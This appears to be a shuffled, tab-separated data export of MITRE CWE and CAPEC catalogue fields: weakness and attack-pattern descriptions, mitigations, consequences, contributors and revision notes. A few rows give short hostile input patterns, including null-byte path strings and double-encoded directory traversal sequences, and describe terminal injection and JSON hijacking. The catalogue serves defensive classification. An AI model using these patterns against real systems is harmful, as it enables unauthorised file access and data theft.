13572	72	The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.
21845	103	Primary
18610	36	https://seclab.stanford.edu/websec/framebusting/framebust.pdf
20800	31	699
6121	39	2010-04-05
11500	28	CWE Content Team
20224	63	Read Application Data
20168	42	If a function returns an error, it is important to either fix the problem and try again, alert the user that an error has happened and let the program continue, or alert the user and close and cleanup the program.
11054	39	2011-06-01
19963	91	Implementation
16523	62	updated Potential_Mitigations
17460	91	Requirements
11358	28	CWE Content Team
16083	59	Updated References
25165	63	Bypass Protection Mechanism
21348	56	ChildOf
17174	79	Integrity
10715	23	An adversary exploits a weakness in input validation on the target to inject new code into that which is currently executing. This differs from code inclusion in that code inclusion involves the addition or replacement of a reference to a code file, which is subsequently loaded by the target and used as part of the code of some application.
13441	28	Sean Eidemiller
15311	63	Read Files or Directories
24350	103	Primary
19504	79	Integrity
16598	81	Other
18075	62	updated References, Relationships, Taxonomy_Mappings
18165	62	updated References, Relationships, Taxonomy_Mappings, White_Box_Definitions
9932	39	2019-01-03
10089	23	The system or application is vulnerable to file system contents disclosure through path equivalence. Path equivalence involves the use of special characters in file and directory names. The associated manipulations are intended to generate multiple names for the same object.
19308	102	ChildOf
23790	23	An adversary engages in probing and exploration activities to determine if common key files exists. Such files often contain configuration and security parameters of the targeted application, system or network. Using this knowledge may often pave the way for more damaging attacks.
11689	100	The MITRE Corporation
8755	39	2017-05-03
24180	78	High
24894	39	2008-07-01
6378	35	MITRE
14617	28	CWE Content Team
20849	39	2014-07-30
8252	42	If using exception handling, catch and throw specific exceptions instead of overly-general exceptions (CWE-396, CWE-397). Catch and handle exceptions as locally as possible so that exceptions do not propagate too far up the call stack (CWE-705). Avoid unchecked or uncaught exceptions where feasible (CWE-248).
6786	31	1000
18573	43	Simple
22286	50	Take an iterative approach to input validation (defense in depth).
17034	89	Standard
19131	28	Eric Dalci
16416	90	C++
11182	40	The application accepts and decodes URL string request.
18142	72	If a PRNG is using a limited entropy source which runs out, and the generator fails open, the generator could produce predictable random numbers. Potentially a weak source of random numbers could weaken the encryption method used for authentication of users.
15058	31	1000
8352	62	updated Description, Other_Notes
18586	35	MITRE
24590	81	Integrity
7343	28	CWE Content Team
18168	47	Hide Activities
14203	28	CWE Content Team
15607	28	Eric Dalci
22211	103	Primary
13953	35	MITRE
9231	43	Simple
6112	46	A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary - to move from untrusted to trusted. A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. By combining trusted and untrusted data in the same data structure, it becomes easier for programmers to mistakenly trust unvalidated data.
23207	39	2017-11-08
25125	96	2009-12-04
5817	56	ChildOf
17775	39	2011-06-01
20663	39	2014-02-18
10163	35	MITRE
8209	39	2014-06-23
10779	47	Resource Consumption
13850	66	RFC: 793, TRANSMISSION CONTROL PROTOCOL
16664	42	Remove unused variables from the code.
10250	31	1000
22322	103	Primary
10156	56	ChildOf
17948	31	700
14404	49	1996
15890	35	Cigital
7027	88	Information Exposure Through Environmental Variables
7865	39	2009-12-28
16607	63	Alter Execution Logic
6823	62	updated Common_Consequences
8307	50	When implementing security features, consider how they can be misused and made to turn on themselves.
21419	28	CWE Content Team
13299	28	CWE Content Team
11835	39	2019-01-03
13205	28	CWE Content Team
22565	39	2014-07-30
18976	85	158
17728	46	There are multiple ways in which this weakness can be introduced, including:                                                the wrong variable or reference;                   an incorrect number of arguments;                   incorrect order of arguments;                   wrong type of arguments; or                   wrong value.
9987	103	Primary
21071	63	DoS: Crash, Exit, or Restart
22196	48	10
15769	28	CWE Content Team
19136	91	Architecture and Design
8726	73	Check Log files. An attacker with access to log files can look at the outcome of bad input.
10670	76	2017-01-09
15656	39	2014-07-30
13975	28	CWE Content Team
9083	35	MITRE
14863	42	Using sealed classes protects object-oriented encapsulation paradigms and therefore protects code from being extended in unforeseen ways.
8923	35	MITRE
14874	97	Retrieve Embedded Sensitive Data
15982	39	2014-06-23
13802	26	Operation
8690	26	Implementation
20297	35	MITRE
14599	48	08
24983	28	CWE Content Team
16355	43	Simple
24337	56	ChildOf
19274	21	CLASP
9241	39	2008-07-01
14814	45	Base
14100	35	MITRE
18446	55	CAPEC Content Team
14388	56	ChildOf
20382	39	2013-02-21
9468	39	2012-05-11
23393	40	The user must allow JavaScript to execute in their browser
20096	54	High
12278	28	CWE Content Team
24766	28	Sean Eidemiller
21322	39	2008-07-01
11522	81	Other
17683	97	Log Injection-Tampering-Forging
19689	28	CWE Content Team
11578	62	updated Common_Consequences, Detection_Factors, Potential_Mitigations, References
15018	81	Other
20817	105	Mobile
17974	35	MITRE
13141	91	Requirements
21654	92	Exploit
10555	55	CAPEC Content Team
23402	81	Confidentiality
14932	28	CWE Content Team
5966	81	Availability
10561	39	2008-09-08
17964	81	Integrity
22795	81	Integrity
16030	81	Availability
18691	56	ChildOf
15815	79	Authorization
19841	44	High
8455	28	CWE Content Team
24480	39	2014-07-30
7602	28	CWE Content Team
15474	35	MITRE
15967	56	ChildOf
16057	97	Cryptanalysis
19585	23	The software has multiple functions, methods, procedures, macros, etc. that      contain the same code.
6275	62	updated References, Relationships, Taxonomy_Mappings
13487	39	2010-09-27
10785	62	updated Description, Potential_Mitigations
19061	39	2017-01-19
5988	28	Eric Dalci
24638	28	CWE Content Team
24711	39	2009-07-27
7789	39	2011-06-01
18771	95	The malicious string then passes through the filter and passed to the underlying API. Everything after the null terminator is ignored. This may give an attacker the opportunity to access file system resources to which they should not have access and do other things.                   Some popular forms in which this takes place:                   PATH%00%5CPATH[0x00][0x5C]PATH[alternate encoding of the NULL][additional characters required to pass filter]
8598	49	2004
7701	100	The MITRE Corporation
23191	74	2
5605	56	ChildOf
8704	62	updated Potential_Mitigations
16419	39	2019-06-20
11055	97	Resource Leak Exposure
7621	81	Integrity
21248	35	MITRE
15836	33	Eldar Marcussen
7991	40	The target application must leverage an open communications channel.
9022	102	ChildOf
19937	40	Backend application implicitly trusts the data stored in the database
23437	55	CAPEC Content Team
20122	42	When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.
15037	68	This is not a complete solution. However, it forces the attacker to guess an unknown value that changes every program execution. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
19587	39	2012-10-30
24598	39	2011-06-01
7202	63	Reduce Maintainability
23197	26	Implementation
8528	59	Updated Related_Attack_Patterns
17342	39	2011-03-29
6737	62	updated Applicable_Platforms, Description
23290	28	CWE Content Team
7583	90	Language-Independent
14104	26	Architecture and Design
19754	39	2010-12-13
8561	56	ChildOf
23828	35	MITRE
18812	35	MITRE
11155	39	2017-11-08
6619	42	Many contemporary languages have functions which properly handle this condition. Older C temp file functions are especially susceptible.
19229	103	Primary
22422	89	Detailed
18728	26	Architecture and Design
22393	57	Primary
7315	28	CWE Content Team
23404	59	Updated References, Related_Weaknesses
14495	28	Eric Dalci
8807	28	CWE Content Team
14622	56	ChildOf
7732	36	http://www.securiteam.com/securitynews/6D0100A5PU.html
17273	56	ChildOf
13689	35	MITRE
19088	35	MITRE
11959	39	2011-06-01
7215	101	CAPEC Content Team
15163	39	2008-11-24
20278	95	[Launch JSON hijack] An attacker lures the victim to the malicious website or leverages other means to get his malicious code executing in the victim's browser. Once that happens, the malicious code makes a request to the victim target system to retrieve a JSON object with sensitive information. The request includes the victim's session cookie if the victim is logged in.
21184	35	MITRE
7443	26	Implementation
9662	61	Draft
11938	66	XML External Entity (XXE) Processing
22744	89	Standard
7251	56	CanPrecede
14015	79	Authorization
15315	76	2015-11-09
24974	44	SOAR Partial
13416	62	updated Relationships
16453	62	updated Potential_Mitigations
21692	50	Avoid clicking on untrusted links.                Employ techniques such as frame busting, which is a method by which developers aim to prevent their site being loaded within a frame.
19041	50	Session tokens for specific host
20146	62	updated Potential_Mitigations
9496	72	The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.
9746	39	2010-09-27
21939	100	The MITRE Corporation
12199	81	Availability
14075	81	Availability
8157	103	Primary
22329	39	2008-09-08
6347	39	2009-07-27
24790	33	J. D. Tygar
23502	39	2017-11-08
23752	28	CWE Content Team
6074	79	Authorization
12251	72	The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.
15746	35	MITRE
13430	28	CWE Content Team
13391	35	MITRE
13010	72	An attacker that can influence the allocation of resources that are not properly released could deplete the available resource pool and prevent all other processes from accessing the same type of resource.
25222	88	Improper Neutralization of Script in an Error Message Web Page
11379	63	DoS: Resource Consumption (CPU)
21710	56	ChildOf
10213	28	CWE Content Team
18518	56	ChildOf
22953	28	CWE Content Team
9744	39	2012-10-30
14127	33	Sean Barnum
16030	72	If the shared variable contains sensitive data, it may be manipulated or displayed in another user session. If this data is used to control the application, its value can be manipulated to cause the application to crash or perform poorly.
11838	47	Read Data
17238	59	Updated Examples-Instances, References
22468	39	2008-09-08
15128	35	Cigital
12629	23	An adversary, through a previously installed malicious application, registers for a URL scheme intended for a target application that has not been installed. Thereafter, messages intended for the target application are handled by the malicious application. Upon receiving a message, the malicious application displays a screen that mimics the target application, thereby convincing the user to enter sensitive information. This type of attack is most often used to obtain sensitive information (e.g., credentials) from the user as they think that they are interacting with the intended target application.
22234	31	1000
10524	95	An attacker leverages vulnerabilities identified during the Experiment Phase to inject malicious email headers and cause the targeted email application to exhibit behavior outside of its expected constraints.
6258	73	The attacker injects context-appropriate malicious file path in order to manipulate the meta-data of the targeted file.
15410	42	Avoid storing information under the web root directory.
7390	86	https://arxiv.org/abs/1801.01207
23524	76	2018-07-31
13649	28	CWE Content Team
16416	23	A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function).
15732	81	Confidentiality
6006	28	Eric Dalci
8172	39	2008-07-01
21901	28	CWE Content Team
7456	62	updated Common_Consequences
16865	21	PLOVER
12716	103	Primary
5807	54	Low
6910	28	CWE Content Team
5861	40	The targeted application must receive some application code from the server; for example, dynamic updates, patches, applets or scripts.
19018	78	High
16592	39	2010-06-21
17728	23	The product calls a function, procedure, or routine with arguments that are not correctly specified, leading to always-incorrect behavior and resultant weaknesses.
13244	47	Bypass Protection Mechanism
15391	101	CAPEC Content Team
11992	39	2009-03-10
20604	86	https://msdn.microsoft.com/en-us/library/ms972826.aspx
24302	26	Implementation
22803	95	[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.
12757	61	Stable
8862	28	CWE Content Team
22202	63	Alter Execution Logic
7999	79	Availability
23444	43	Simple
25107	62	updated Common_Consequences
20190	28	Eric Dalci
24303	81	Confidentiality
21718	31	1000
12928	90	Language-Independent
15430	28	CWE Content Team
7010	35	MITRE
5948	25	Medium
15685	28	CWE Content Team
14726	39	2019-09-19
16847	44	SOAR Partial
7147	39	2017-05-03
14511	39	2012-10-30
15757	56	ChildOf
19869	31	1000
25004	45	Base
10649	81	Non-Repudiation
7841	28	CWE Content Team
20814	61	Stable
8565	28	CWE Content Team
17557	62	updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities
9832	35	MITRE
12590	28	CWE Content Team
18454	55	CAPEC Content Team
12170	39	2011-06-01
13939	69	Incomplete
15235	43	Simple
10404	35	MITRE
10921	33	John Viega
16973	89	Detailed
10622	85	192
22990	61	Draft
13516	74	3
14409	28	CWE Content Team
14954	28	CWE Content Team
6943	67	High
19326	103	Primary
20631	35	MITRE
7077	28	CWE Content Team
9187	39	2008-07-01
7014	28	CWE Content Team
21586	89	Detailed
11452	80	Knowledge of the affected system, including what devices are connected to it, as well as knowledge of how to extract information from these devices.
10556	54	Low
25210	81	Other
24197	46	The use of impersonated credentials allows an ASP.NET application to run with either the privileges of the client on whose behalf it is executing or with arbitrary privileges granted in its configuration.
17804	35	MITRE
13534	39	2019-06-20
14419	103	Primary
19614	39	2019-09-23
10831	35	MITRE
8961	35	MITRE
5844	79	Confidentiality
7230	76	2019-04-04
19051	81	Availability
24179	39	2017-11-08
19684	62	updated Relationships
25220	47	Read Data
6269	35	MITRE
10171	31	699
17292	57	Resultant
8136	74	1
13534	62	updated Type
6541	31	1000
25183	62	updated Name
17162	36	http://secunia.com/advisories/16869/
8966	85	294
20074	46	When the size of the destination is smaller than the size of the source, a buffer overflow could occur.
21344	39	2012-05-11
21700	28	CWE Content Team
10491	35	MITRE
24367	103	Primary
9190	28	CWE Content Team
14285	59	Updated Related_Attack_Patterns
16355	23	A Pseudo-Random Number Generator (PRNG) uses the same seed each time the product is initialized.
16536	28	CWE Content Team
17971	39	2017-05-03
13609	66	Poison NULL byte
8169	62	updated Common_Consequences
11861	90	Language-Independent
8987	72	An attacker could read sensitive data, either by reading the data directly from a data store that is not properly restricted, or by accessing insufficiently-protected, privileged functionality to read the data.
24471	62	updated Relationships, Taxonomy_Mappings
12499	35	MITRE
16202	95	Crack the encrypted ticket to harvest plain text credentials
7280	100	The MITRE Corporation
14672	50	Implementation: Hide inner ordering of HTTP response header.
24884	101	CAPEC Content Team
6924	63	Quality Degradation
6725	72	If the memory accessible by the attacker can be effectively controlled, it may be possible to execute arbitrary code, as with a standard buffer overflow and possibly without the use of large inputs if a precise index can be controlled.
18076	101	CAPEC Content Team
8778	39	2012-05-11
9778	28	CWE Content Team
6611	39	2017-11-08
12627	55	CAPEC Content Team
8219	46	Paired delimiters might include:                                                < and > angle brackets                   ( and ) parentheses                   { and } braces                   [ and ] square brackets                   " " double quotes                   ' ' single quotes
20835	35	MITRE
23862	28	CWE Content Team
9282	22	06
24016	79	Access Control
22880	31	699
7796	79	Confidentiality
6522	35	MITRE
24283	39	2008-09-08
17903	39	2008-09-08
20032	55	CAPEC Content Team
19789	99	SANS Software Security Institute
8053	56	ChildOf
17739	40	None
14425	28	CWE Content Team
10620	103	Primary
6550	101	CAPEC Content Team
24264	39	2017-11-08
18937	39	2010-09-27
11437	62	updated Potential_Mitigations
17329	88	Insufficient Psychological Acceptability
6930	35	MITRE
11219	91	Implementation
10077	76	2017-08-04
14561	55	CAPEC Content Team
6144	43	Simple
24220	62	updated Potential_Mitigations
20763	39	2011-09-13
12333	28	CWE Content Team
15196	50	Install a web application firewall that has been secured against HTTP Request Splitting
8794	35	MITRE
10017	48	03
5793	91	Architecture and Design
21123	73	Use automated tools or send web server specific commands to web server and then receive server's response.
15623	90	Language-Independent
15977	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
21510	103	Primary
16986	62	updated Relationships, Taxonomy_Mappings
22168	79	Availability
8435	86	http://www.cs.purdue.edu/homes/cs390s/slides/week09.pdf
16324	102	ChildOf
13465	35	MITRE
23606	63	Hide Activities
5924	62	updated Common_Consequences
20669	35	MITRE
13836	35	MITRE
24991	100	The MITRE Corporation
9179	69	Draft
22299	39	2014-07-30
21096	62	updated Potential_Mitigations
20828	28	CWE Content Team
15175	63	Execute Unauthorized Code or Commands
10152	28	CWE Content Team
19118	56	ChildOf
20234	100	The MITRE Corporation
12764	62	updated Common_Consequences
24976	76	2018-07-31
21381	39	2012-05-11
25236	100	The MITRE Corporation
23456	26	Architecture and Design
7637	79	Confidentiality
13433	39	2009-07-27
10309	48	02
15542	31	699
6499	91	Architecture and Design
17881	39	2011-06-01
16859	73	The adversary decides to target the cache server by forging new responses. The server will then cache the second request and response. The cached response has most likely an attack vector like Cross-Site Scripting; this attack will then be serve to many clients due to the caching system.
22200	97	Fake the Source of Data
15686	62	updated Relationships
7402	55	CAPEC Content Team
13773	35	MITRE
19608	25	High
9844	56	ChildOf
22526	62	updated Common_Consequences
23506	49	2008
21106	96	2018-07-02
23245	104	1091
18453	57	Primary
18495	90	Language-Independent
14225	62	updated Common_Consequences
9269	35	MITRE
25306	102	ChildOf
20297	28	CWE Content Team
7073	39	2011-06-01
14633	39	2017-11-08
12900	35	MITRE
7398	53	The MITRE Corporation
15987	28	CWE Content Team
19720	28	CWE Content Team
6729	39	2013-07-17
20449	102	ChildOf
19162	26	Architecture and Design
14671	62	updated Demonstrative_Examples, Taxonomy_Mappings
18067	62	updated Related_Attack_Patterns
14079	35	MITRE
12354	81	Availability
14933	104	759
22123	56	ChildOf
14536	31	699
8404	101	CAPEC Content Team
7607	28	CWE Content Team
13935	28	CWE Content Team
6863	35	MITRE
9576	89	Standard
14438	56	ChildOf
14251	45	Class
25053	62	updated Common_Consequences
17196	35	MITRE
17496	39	2011-06-01
19771	28	CWE Content Team
6876	97	Blind SQL Injection
16691	91	Requirements
10929	81	Integrity
22755	39	2012-10-30
24695	40	The ability to send an ICMP type 8 query (Echo Request) to a remote target and receive an ICMP type 0 message (ICMP Echo Reply) in response. Any firewalls or access control lists between the sender and receiver must allow ICMP Type 8 and ICMP Type 0 messages in order for a ping operation to succeed.
8337	28	CWE Content Team
13883	97	Open Source Libraries Altered
22841	45	Base
8441	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
25213	39	2011-03-29
9122	91	Architecture and Design
17580	26	Implementation
16693	28	CWE Content Team
15649	56	ChildOf
19923	38	If the first path decoding process has left some invalid or blacklisted characters, that may be a sign that the request is malicious.
20496	35	MITRE
24986	79	Confidentiality
20953	25	Low
9142	81	Integrity
12265	35	MITRE
14752	63	Execute Unauthorized Code or Commands
13166	28	CWE Content Team
18661	35	MITRE
11018	104	835
20273	78	High
16184	39	2012-05-11
24651	86	http://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf
23666	104	222
16621	55	CAPEC Content Team
19610	97	Influence Perception of Commitment and Consistency
21460	54	Low
23440	28	CWE Content Team
18028	63	Read Application Data
8526	45	Base
20144	56	ChildOf
25016	21	CWE Content Team
22859	71	2009
16551	39	2012-05-11
5668	28	CWE Content Team
11089	79	Confidentiality
20298	23	An adversary manipulates the use or processing of an Application Programming Interface (API) resulting in an adverse impact upon the security of the system implementing the API. This can allow the adversary to execute functionality not intended by the API implementation, possibly compromising the system which integrates the API. API manipulation can take on a number of forms including forcing the unexpected use of an API, or the use of an API in an unintended way. For example, an adversary may make a request to an application that leverages a non-standard API that is known to incorrectly validate its data and thus it may be manipulated by supplying metacharacters or alternate encodings as input, resulting in any number of injection flaws, including SQL injection, cross-site scripting, or command execution. Another example could be API methods that should be disabled in a production application but were not, thus exposing dangerous functionality within a production environment.
20805	81	Integrity
21859	23	The code performs a comparison such as an         equality test between two float (floating point) values, but         it uses comparison operators that do not account for the         possibility of loss of precision.
14057	39	2011-06-27
19223	32	The Web Application Security Consortium (WASC)
14626	62	updated Common_Consequences
12705	101	CAPEC Content Team
25392	39	2012-05-11
5810	28	CWE Content Team
6210	103	Primary
24392	78	High
18372	31	1000
23135	103	Primary
19906	81	Other
7241	21	CLASP
24408	35	MITRE
7179	39	2009-03-10
23498	42	Mitigation of resource exhaustion attacks requires that the target system either:                                                                  recognizes the attack and denies that user further access for a given amount of time, or                         uniformly throttles all requests in order to make it more difficult to consume resources more quickly than they can again be freed.                                                            The first of these solutions is an issue in itself though, since it may allow attackers to prevent the use of the system by a particular valid user. If the attacker impersonates the valid user, they may be able to prevent the user from accessing the server in question.                   The second solution is simply difficult to effectively institute -- and even when properly done, it does not provide a full solution. It simply makes the attack require more resources on the part of the attacker.
7052	103	Primary
7834	62	updated Common_Consequences
21993	62	updated Demonstrative_Examples
24140	90	Language-Independent
8320	35	MITRE
23677	62	updated Potential_Mitigations, Relationships
13740	25	Low
17614	31	699
25239	28	CWE Content Team
11235	63	Modify Files or Directories
10357	39	2014-07-30
18032	74	1
7982	39	2012-10-30
16608	66	Insufficient Process Validation
7330	91	Implementation
10764	62	updated Alternate_Terms, Background_Details, Description, Detection_Factors, Likelihood_of_Exploit, Name, Relationships, Observed_Example, Taxonomy_Mappings
15719	103	Primary
12903	35	MITRE
8741	91	Implementation
24807	62	updated Common_Consequences
10936	39	2014-07-30
22821	30	Abdelberi Chaabane
24234	50	Properly handle the NULL characters supplied as part of user input prior to doing anything with the data.
18538	39	2017-11-08
15504	35	MITRE
14350	91	Architecture and Design
17492	62	updated Other_Notes, Research_Gaps
23588	28	CWE Content Team
8705	32	http://www.debian.org/security/2008/dsa-1571
18264	47	Other
11719	56	ChildOf
6151	28	CWE Content Team
6062	53	The MITRE Corporation
21534	81	Other
23214	62	updated Observed_Examples, Potential_Mitigations
21552	79	Integrity
5823	28	CWE Content Team
5775	28	CWE Content Team
25006	63	Modify Application Data
11065	35	MITRE
20034	63	Reduce Maintainability
13080	62	updated Relationships
12636	40	The ability to send an ACK packet to a remote host and identify the response. Creating the ACK packet without building a full connection requires the use of raw sockets. As a result, it is not possible to send a TCP ACK ping from some systems (Windows XP SP 2) without the use of third-party packet drivers like Winpcap. On other systems (BSD, Linux) administrative privileges are required in order to write to the raw socket.
21946	53	The MITRE Corporation
16792	91	Implementation
20641	51	2014-06-23
17096	50	All application processes should be run with the minimal privileges required. Also, processes must shed privileges as soon as they no longer require them.
21459	35	MITRE
13810	62	updated Relationships, Taxonomy_Mappings
16460	59	Updated Related_Weaknesses
25216	35	Cigital
9834	90	Language-Independent
15975	35	MITRE
12281	24	MITRE
16651	61	Draft
9626	40	The target must fail to verify the integrity of the DLL before using them.
9454	23	This attack exploits terminal devices that allow themselves to be written to by other users. The attacker sends command strings to the target terminal device hoping that the target user will hit enter and thereby execute the malicious command with their privileges. The attacker can send the results (such as copying /etc/passwd) to a known directory and collect once the attack has succeeded.
23721	62	updated Relationships, Taxonomy_Mappings
15242	103	Primary
21181	38	An attacker can use a fuzzer in order to probe for this vulnerability. The fuzzer should generate suspicious network activity noticeable by an intrusion detection system.
11835	62	updated Relationships, Taxonomy_Mappings
14912	28	CWE Content Team
17955	33	Michael Howard
11144	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
8882	39	2017-11-08
11629	39	2012-05-11
15861	35	MITRE
16398	43	Simple
24666	31	699
21382	81	Confidentiality
19027	62	updated Demonstrative_Examples, Potential_Mitigations, References, Relationships
24589	39	2011-06-01
22577	69	Incomplete
14286	59	Updated Description, Description Summary
20044	35	MITRE
9237	35	MITRE
15734	102	ChildOf
14499	100	The MITRE Corporation
7057	92	Exploit
19164	28	CWE Content Team
25075	26	Architecture and Design
8920	49	2002
8267	39	2008-09-08
22521	35	MITRE
22151	104	785
23436	62	updated Time_of_Introduction
15763	47	Hide Activities
6985	39	2017-01-19
24780	88	Unconditional Control Flow Transfer outside of Switch Block
14417	81	Access Control
9238	104	770
6132	26	Implementation
5803	39	2008-10-14
11888	35	MITRE
13992	40	The system uses password based authentication as the one factor authentication mechanism.
12998	47	Other
14476	26	Operation
22598	28	CWE Content Team
11825	79	Availability
14675	54	High
12019	43	Simple
22909	26	Architecture and Design
11218	28	CWE Content Team
9952	28	CWE Content Team
6216	25	Medium
16120	28	CWE Content Team
18976	40	The adversary must obtain a logical position on the network from intercepting target network traffic is possible. Depending on the network topology, traffic sniffing may be simple or challenging. If both the target sender and target recipient are members of a single subnet, the adversary must also be on that subnet in order to see their traffic communication.
14947	35	MITRE
19240	59	Updated Consequences, References
13005	39	2014-06-23
18733	26	Architecture and Design
22353	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.
7598	103	Primary
6165	104	553
10322	63	Execute Unauthorized Code or Commands
13519	97	Regular Expression Exponential Blowup
16202	73	Leverage a brute force application/script on the hashed value offline until cracked. The shorter the password, the easier it is to crack.
23004	92	Explore
6480	39	2010-06-21
10747	44	High
22967	72	When the consequence is arbitrary code execution, this can often be used to subvert any other security service.
12661	62	updated Relationships
24802	24	Cigital
19750	23	In circumstances where an application holds important data client-side in tokens (cookies, URLs, data files, and so forth) that data can be manipulated. If client or server-side application components reinterpret that data as authentication tokens or data (such as store item pricing or wallet information) then even opaquely manipulating that data may bear fruit for an Attacker. In this pattern an attacker undermines the assumption that client side tokens have been adequately protected from tampering through use of encryption or obfuscation.
13551	35	MITRE
10714	28	CWE Content Team
13516	73	Combine same encoding multiple times and observe its effects. For example, if special characters are encoded with a leading backslash, then the following encoding may be accepted by the application/system: "\\\.". With two parsing layers, this may get converted to "\." after the first parsing layer, and then, to "." after the second. If the input validation layer is between the two parsing layers, then "\\\.\\\." might pass a test for ".." but still get converted to ".." afterwards. This may enable directory traversal attacks.
12445	81	Availability
12369	62	updated Demonstrative_Examples
17091	24	MITRE
14788	39	2011-06-27
10339	28	CWE Content Team
18861	28	CWE Content Team
25192	103	Primary
18024	39	2011-06-27
9785	50	All output displayed to clients must be properly escaped. Escaping ensures that the browser interprets special scripting characters literally and not as script to be executed.
9769	104	914
13916	31	1000
15619	39	2008-08-15
15205	28	CWE Content Team
16270	91	Implementation
8902	35	Cigital
19495	35	MITRE
8562	90	Language-Independent
15065	23	The software performs a comparison between entities that must consider multiple factors or characteristics of each entity, but the comparison does not include one or more of these factors. This can lead to resultant weaknesses, e.g. by operating on the wrong object.
24637	66	An Attack Surface Metric
10238	56	ChildOf
20693	23	The product uses external input to determine the names of variables into which information is extracted, without verifying that the names of the specified variables are valid. This could cause the program to overwrite unintended variables.
19204	63	Unexpected State
6440	62	updated Relationships, Taxonomy_Mappings
22138	33	SUN
12484	103	Primary
13322	45	Base
18937	62	updated Name
9224	49	2004
19164	39	2009-10-29
22520	26	Architecture and Design
22638	76	2019-04-04
23027	45	Base
22702	28	CWE Content Team
8991	88	Reliance on Cookies without Validation and Integrity Checking in a Security Decision
24632	80	In order to discover format string vulnerabilities it takes only low skill, however, converting this discovery into a working exploit requires advanced knowledge on the part of the adversary.
21322	35	Cigital
5648	28	CWE Content Team
24947	92	Exploit
8425	62	updated Relationships, Taxonomy_Mappings
16290	28	CWE Content Team
6167	35	MITRE
17830	39	2010-12-13
22243	42	Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which code can be executed by your software.                   Examples include the Unix chroot jail and AppArmor. In general, managed code may provide some protection.                   This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.                   Be careful to avoid CWE-243 and other weaknesses related to jails.
16692	26	Implementation
10026	61	Draft
16589	38	Repeated errors generated by the same piece of code are an indication, although it requires careful monitoring of the application and its associated error logs, if any.
7996	62	updated Relationships, Taxonomy_Mappings
15775	90	C++
13124	28	CWE Content Team
8265	103	Primary
10972	35	MITRE
6556	39	2017-11-08
20532	28	CWE Content Team
12903	39	2010-04-05
22588	23	The product allocates memory based on an untrusted size value, but it does not validate or incorrectly validates the size, allowing arbitrary amounts of memory to be allocated.
21618	86	http://msdn.microsoft.com/en-us/library/ms972976.aspx
22410	63	Quality Degradation
19245	73	Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.
9887	26	Implementation
15049	62	updated Potential_Mitigations
11718	88	Undefined Behavior for Input to API
16569	35	Cigital
21285	69	Incomplete
16250	102	ChildOf
22884	28	CWE Content Team
22613	39	2018-03-27
25207	28	CWE Content Team
9363	62	updated Relationships
15378	62	updated Related_Attack_Patterns
12626	26	Implementation
20250	56	ChildOf
23338	62	updated Potential_Mitigations
8188	35	MITRE
24449	90	C
7829	35	MITRE
18641	39	2011-06-01
17855	76	2018-07-31
14630	51	2014-06-23
5861	50	Operation: Use "ifconfig/ipconfig" or other tools to detect the sniffer installed in the network.
8853	39	2012-05-11
19935	88	Uncontrolled Recursion
12937	86	http://www.security-assessment.com/Whitepapers/0x00_vs_ASP_File_Uploads.pdf
19605	73	The attacker tampers with the SOAP message parameters by injecting some special characters such as single quotes, double quotes, semi columns, etc. The attacker observes system behavior.
17349	62	updated Description, Name, Potential_Mitigations, Relationship_Notes, Relationships, Taxonomy_Mappings
8858	48	01
19810	63	Bypass Protection Mechanism
19298	62	updated Relationships
6876	38	The only indicators of successful Blind SQL Injection are the application or database logs that show similar queries with slightly differing logical conditions that increase in complexity over time. However, this requires extensive logging as well as knowledge of the queries that can be used to perform such injection and return meaningful information from the database.
16638	59	Updated Related_Weaknesses
9370	21	PLOVER
14610	62	updated Related_Attack_Patterns
18242	103	Primary
9441	81	Confidentiality
19018	85	146
19170	76	2019-04-04
6851	72	If an input is syntactically invalid, then processing the input could place the system in an unexpected state that could lead to a crash, consume available system resources or other unintended behaviors.
7738	92	Explore
25097	62	updated References
11889	23	The software contains dead code, which can never be executed.
22100	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
20100	23	The software does not handle or incorrectly handles when more values are provided than expected.
20607	24	MITRE
12793	62	updated Potential_Mitigations
20518	28	CWE Content Team
10117	35	MITRE
14010	59	Updated Consequences
5861	85	65
17218	90	Language-Independent
24398	35	MITRE
17315	43	Simple
15672	62	updated Description, Other_Notes, Potential_Mitigations
17505	35	MITRE
24442	42	Store the sensitive data in a "volatile" memory location if available.
21857	90	Language-Independent
10357	62	updated Relationships, Taxonomy_Mappings
18919	28	CWE Content Team
14881	39	2012-05-11
19264	31	1000
8406	40	Session IDs are used to control access to resources.
18112	62	updated Potential_Mitigations
10744	24	MITRE
10838	35	MITRE
17508	79	Availability
8356	62	updated Description, Name, References, Relationship_Notes
21154	35	MITRE
12288	27	None: No specialized resources are required to execute this type of attack.
19290	76	2017-08-04
17256	21	CLASP
21193	43	Simple
10988	28	CWE Content Team
15231	48	06
10182	28	CWE Content Team
11572	28	CWE Content Team
15847	35	MITRE
25287	28	CWE Content Team
